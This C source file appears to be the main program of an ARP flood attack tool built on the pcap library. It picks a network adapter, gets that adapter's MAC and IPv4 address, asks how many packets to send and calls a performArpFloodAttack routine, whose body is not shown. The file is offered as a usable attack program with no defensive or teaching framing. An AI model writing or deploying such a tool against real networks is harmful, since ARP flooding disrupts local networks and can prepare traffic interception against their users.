#include "libraries.h"
#include "address_fetchers.h"
#include "network_utils.h"
#include "display_functions.h"

int main() {
    init_random();

    pcap_if_t *device = selectDevice();  // The device to sniff on
    if (device == NULL) {
        printf("ERROR: device not found!\n");
        return 0;
    }

    // getting mac of device
    unsigned char *src_mac = malloc(6 * sizeof(char));
    if (getMacAddressOfAdapter(src_mac, device) == FAILED_MAC_RETRIEVAL) {
        printf("ERROR: failed mac retrieval!\n");
        free(src_mac);
        return 1;
    }

    // getting ip of device
    unsigned char **ipv4list;
    int len_list = getIPv4ListOfAdapter(device, &ipv4list);
    unsigned char *src_ip = ipv4list[0];          // There is hardcoded here, but you can write an address selection function

    printDeviceInfo(src_mac, src_ip, device);

    int num_packets_to_send = 0;
    printf("\nEnter number of packets to send: ");
    if (scanf_s("%d", &num_packets_to_send) == 0) {
        printf("ERROR: not a number!\n");
    }

    performArpFloodAttack(device, src_mac, src_ip, num_packets_to_send);

    free(src_mac);
    for (int i = 0; i < len_list; i++) {
        free(ipv4list[i]);
    }
    free(ipv4list);
    return 0;
}